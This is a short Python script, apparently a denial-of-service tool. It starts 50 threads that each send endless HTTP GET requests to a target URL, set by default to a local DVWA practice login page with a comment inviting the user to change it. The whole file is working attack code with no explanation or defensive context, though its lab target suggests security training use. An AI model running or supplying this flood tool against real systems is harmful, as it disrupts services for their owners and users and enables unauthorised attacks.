import requests
import threading

def send_request(url):
    while True:
        try:
            response = requests.get(url)
            print(f"Request sent, status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

def start_attack(url, threads):
    thread_list = []
    for i in range(threads):
        thread = threading.Thread(target=send_request, args=(url,))
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()

if __name__ == "__main__":
    target_url = "http://localhost/dvwa/login.php"  # Change to your DVWA URL
    number_of_threads = 50  # Adjust the number of threads

    start_attack(target_url, number_of_threads)
